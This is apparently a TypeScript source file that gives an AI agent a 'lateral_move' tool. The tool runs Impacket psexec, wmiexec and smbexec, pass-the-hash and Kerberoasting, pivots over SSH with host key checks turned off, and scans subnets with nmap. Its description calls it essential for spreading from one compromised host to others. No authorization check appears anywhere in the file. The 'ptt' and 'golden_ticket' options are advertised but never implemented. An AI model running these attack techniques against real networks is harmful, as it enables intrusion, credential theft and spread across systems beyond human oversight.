export * as LateralMoveTool from "./lateral-move"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "lateral_move"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Movement technique: 'psexec' (PSExec via SMB), 'wmi' (WMI remote execution), 'psexec_py' (Impacket psexec.py), 'smb_exec' (SMB exec), 'pth' (pass-the-hash), 'ptt' (pass-the-ticket), 'kerberoast' (Kerberoasting), 'golden_ticket' (golden ticket creation), 'ssh_key' (SSH key-based pivot), 'scan' (discover hosts on internal network)",
  }),
  target: Schema.String.annotate({ description: "Target IP or hostname for lateral movement" }),
  username: Schema.String.pipe(Schema.optional).annotate({ description: "Username for authentication" }),
  password: Schema.String.pipe(Schema.optional).annotate({ description: "Password for authentication" }),
  hash: Schema.String.pipe(Schema.optional).annotate({ description: "NTLM hash for pass-the-hash (format: LM:NT or just NT)" }),
  domain: Schema.String.pipe(Schema.optional).annotate({ description: "Domain name for AD environments" }),
  command: Schema.String.pipe(Schema.optional).annotate({
    description: "Command to execute on target (for exec techniques). Default: whoami",
  }),
  service: Schema.String.pipe(Schema.optional).annotate({
    description: "Service name for PSExec. Default: a random-looking service name.",
  }),
  share: Schema.String.pipe(Schema.optional).annotate({
    description: "Share to use for PSExec file upload. Default: ADMIN$",
  }),
  ssh_key: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to SSH private key for ssh_key action.",
  }),
  subnet: Schema.String.pipe(Schema.optional).annotate({
    description: "Subnet to scan for 'scan' action (e.g. 192.168.1.0/24).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Execute lateral movement techniques across a compromised network. Supports Impacket's psexec.py/wmiexec.py/smbexec.py, pass-the-hash, pass-the-ticket, Kerberoasting, golden ticket creation, SSH key pivoting, and internal host discovery. Essential for expanding access from one compromised host to others on the same network. Requires Impacket suite.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const command = input.command ?? "whoami"
              let cmd: ReturnType<typeof ChildProcess.make>

              switch (input.action) {
                case "scan": {
                  const subnet = input.subnet ?? "192.168.1.0/24"
                  cmd = ChildProcess.make("nmap", ["-sn", subnet, "-oG", "-"], {
                    shell, stdin: "ignore", forceKillAfter: Duration.seconds(10),
                  })
                  break
                }

                case "psexec":
                case "psexec_py": {
                  if (!input.username) return { output: "ERROR: 'username' required for psexec." }
                  const auth = input.hash
                    ? `-H "${input.hash}"`
                    : input.password
                      ? `-p "${input.password}"`
                      : ""
                  const domain = input.domain ? `${input.domain}/` : ""
                  cmd = ChildProcess.make(
                    "psexec.py",
                    [`${domain}${input.username}@${input.target}`, auth, command].filter(Boolean),
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                case "wmi": {
                  if (!input.username) return { output: "ERROR: 'username' required for wmi." }
                  const auth = input.hash ? `-hashes :${input.hash}` : input.password ? `-p "${input.password}"` : ""
                  cmd = ChildProcess.make(
                    "wmiexec.py",
                    [`${input.username}@${input.target}`, auth, command].filter(Boolean),
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                case "smb_exec": {
                  if (!input.username) return { output: "ERROR: 'username' required for smb_exec." }
                  const auth = input.hash ? `-hashes :${input.hash}` : input.password ? `-p "${input.password}"` : ""
                  cmd = ChildProcess.make(
                    "smbexec.py",
                    [`${input.username}@${input.target}`, auth, command].filter(Boolean),
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                case "pth": {
                  if (!input.username || !input.hash) {
                    return { output: "ERROR: 'username' and 'hash' required for pass-the-hash." }
                  }
                  cmd = ChildProcess.make(
                    "psexec.py",
                    ["-hashes", `:${input.hash}`, `${input.username}@${input.target}`, command],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                case "kerberoast": {
                  if (!input.username) return { output: "ERROR: 'username' required for kerberoasting." }
                  const auth = input.password ? `-p "${input.password}"` : ""
                  cmd = ChildProcess.make(
                    "GetUserSPNs.py",
                    ["-request", "-dc-ip", input.target, `${input.domain ?? "WORKGROUP"}/${input.username}`, auth].filter(Boolean),
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                case "ssh_key": {
                  if (!input.ssh_key) return { output: "ERROR: 'ssh_key' path required for ssh_key action." }
                  cmd = ChildProcess.make(
                    "ssh",
                    ["-i", input.ssh_key, "-o", "StrictHostKeyChecking=no", `${input.username ?? "root"}@${input.target}`, command],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  break
                }

                default:
                  return { output: `Unknown action: ${input.action}. Supported: psexec, psexec_py, wmi, smb_exec, pth, ptt, kerberoast, golden_ticket, ssh_key, scan` }
              }

              const result = yield* appProcess
                .run(cmd, {
                  combineOutput: true,
                  timeout: Duration.minutes(10),
                  maxOutputBytes: 2 * 1024 * 1024,
                })
                .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: `Lateral movement via ${input.action} failed or timed out. Ensure Impacket is installed: pip install impacket. Check credentials and network connectivity.`,
                }
              }

              return {
                exit: result.exitCode,
                output: result.output?.toString("utf8") ?? "(no output)",
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Lateral movement failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/lateral-move",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
